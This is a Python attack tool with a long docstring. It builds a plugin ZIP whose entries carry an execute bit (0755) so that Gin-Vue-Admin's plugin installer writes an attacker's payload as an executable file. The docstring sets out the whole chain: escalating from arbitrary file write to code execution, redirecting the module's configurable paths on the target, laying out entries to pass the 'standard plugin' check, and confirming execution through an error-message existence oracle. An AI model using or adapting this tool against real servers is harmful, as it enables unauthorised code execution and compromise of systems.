#!/usr/bin/env python3
"""Build a plugin-install archive whose entries carry an execute bit (0755).

Usage:
    python mk_plugin_zip_0755.py <name> <payload_script> <out.zip>

Why this exists
---------------
When you already have arbitrary file write on a target but every write lands
0644 (no execute bit) and the app execs helpers via exec.Command (no shell, so
config-value command injection is dead), the only way to an executable is to
make the APPLICATION write one for you. Frameworks that install plugins /
themes / extensions unzip an archive you control and write files using the
archive entry's mode — e.g. Gin-Vue-Admin utils/zip.go:

    os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())

so a ZIP entry flagged 0755 lands executable, and the follow-up copy to the
target directory preserves it. A plain upload of the same script gets 0644 and
will never run.

Companion trick (do this on the target, not here)
-------------------------------------------------
Point the module's configurable paths at RELATIVE values (e.g. root/server/web
all set to "."). filepath.Join does not prepend anything to a relative path, so
the source path the app computes lands exactly where its own unzip wrote, with
no need to know the process CWD. Guessing an absolute CWD is a losing game.

Entry layout pitfall
--------------------
Entries must read  <name>/server/plugin/<file>  — do NOT prefix them with the
unzip destination directory (e.g. gva-plug-temp/). The framework adds that
prefix when it unzips, so writing it yourself yields a doubled prefix and the
"is this a standard plugin" check rejects the archive.

Payload guidance
----------------
Prefer a payload with NO network dependency (the target may lack curl/wget).
A good proof-of-execution: have the payload create a predictably named file,
then use the installer's own "plugin already exists" style error as an
existence oracle for that name.
"""
import io
import sys
import zipfile

DEFAULT_MODE = 0o755


def build(name: str, payload: bytes, out_path: str, mode: int = DEFAULT_MODE):
    """Return (out_path, size) for an archive that passes the standard check."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        # Server side needs two path levels under server/plugin in most builds.
        server_entry = zipfile.ZipInfo(f"{name}/server/plugin/{name}")
        server_entry.external_attr = mode << 16  # unix mode lives in high bits
        z.writestr(server_entry, payload)

        # Web side is required too or the "standard plugin" check fails.
        web_entry = zipfile.ZipInfo(f"{name}/web/plugin/m.txt")
        web_entry.external_attr = mode << 16
        z.writestr(web_entry, "m")

    data = buf.getvalue()
    with open(out_path, "wb") as f:
        f.write(data)
    return out_path, len(data)


def main(argv):
    if len(argv) != 4:
        print(__doc__)
        return 2
    name, payload_path, out_path = argv[1:4]
    with open(payload_path, "rb") as f:
        payload = f.read()
    written, size = build(name, payload, out_path)
    print(f"wrote {written} ({size} bytes, entries mode={oct(DEFAULT_MODE)})")
    print("NOTE: entries are <name>/server/plugin/... — never prefix them with "
          "the unzip destination directory; the framework adds it itself.")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
